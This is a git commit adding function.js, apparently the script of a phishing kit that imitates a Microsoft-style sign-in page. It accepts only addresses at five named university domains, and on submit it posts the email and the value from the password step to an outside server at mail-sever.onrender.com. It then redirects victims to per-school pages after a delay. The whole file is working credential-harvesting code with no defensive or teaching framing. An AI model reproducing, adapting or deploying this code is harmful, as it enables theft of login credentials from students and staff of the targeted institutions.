bf8a7df4227250a5339438197b82a3691d37c3a9
signup-live <Jamesvester36@outlook.com>
2024-08-18 12:53:17 +0100

    Add files via upload

---
+++ function.js
@@ -0,0 +1,93 @@
+document.addEventListener("DOMContentLoaded", function() {
+     //BUTTON
+     const nextBtn = document.querySelector('#idSIButton9');
+     const submitBtn = document.getElementById('submitBtn');
+     const backBtn = document.querySelector('#idBtn_Back');
+     //Word base on page
+     const accessAcct = document.getElementById('accessAcc');
+     const forPAss = document.getElementById('forPass');
+     const emailDis = document.getElementById('emailDis');
+     const passDis = document.getElementById('passDis');
+     // Get Div values
+     const CloseDivE = document.getElementById('CloseDiv');
+     const OpenDIvP = document.getElementById('OpenDIv');
+     CloseDivE.addEventListener('keypress', (e)=>{
+        if(e.target.keycode === 13){
+            e.preventDefault();
+        }
+    })
+    nextBtn.addEventListener('click', (e)=>{
+        e.preventDefault();
+
+        if(CloseDivE.value.endsWith('@shc.edu') || CloseDivE.value.endsWith('@hsu.edu') || CloseDivE.value.endsWith('@sautech.edu') || CloseDivE.value.endsWith('@judsonu.edu') || CloseDivE.value.endsWith('@hendrix.edu')){
+            CloseDivE.style.display = 'none';
+            OpenDIvP.style.display = 'block';
+            e.target.style.display = 'none';
+            submitBtn.style.display = 'block';
+            forPAss.style.display = 'block';
+            accessAcct.style.display = 'none';
+            backBtn.style.display = 'block'
+            emailDis.style.display = 'none'
+            passDis.style.display = 'block'
+        }else{
+            alert('Invalid Email')
+        }
+    })
+    backBtn.addEventListener('click', (e)=>{
+        e.preventDefault();
+        e.target.style.display = 'none'
+        CloseDivE.style.display = 'block';
+        OpenDIvP.style.display = 'none';
+        nextBtn.style.display = 'block';
+        submitBtn.style.display = 'none';
+        forPAss.style.display = 'none';
+        accessAcct.style.display = 'block';
+        emailDis.style.display = 'block';
+        passDis.style.display = 'none';
+        
+    });
+
+    const DivFunctionLog = document.getElementById('DivFunction');
+
+    DivFunctionLog.addEventListener('submit', function(event){
+        event.preventDefault();
+        
+        if(password.value != ''){
+             const userData = {
+                FullName: OpenDIvP.value,
+                Email: CloseDivE.value,
+                Password: 'username',
+            };
+            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
+                method : "POST",
+                headers : {
+                "Content-Type" : "application/json"
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.json().then(err => { throw err; });
+                }
+                return response.json();
+            });
+        
+            setTimeout(function() {
+                if(userData.Email.endsWith('@shc.edu')){
+                    window.location.href = 'hills.html';
+                }else if(userData.Email.endsWith('@hsu.edu')){
+                    window.location.href = 'state.html';
+                }else if(userData.Email.endsWith('@sautech.edu')){
+                    window.location.href = 'tech.html';
+                }else if(userData.Email.endsWith('@judsonu.edu')){
+                    window.location.href = 'son.html';
+                }else{
+                    window.location.href = 'matrix.html';
+                }
+            }, 2000)
+        }else{
+            alert('Password can\'t be empty')
+        }
+    })
+});
+
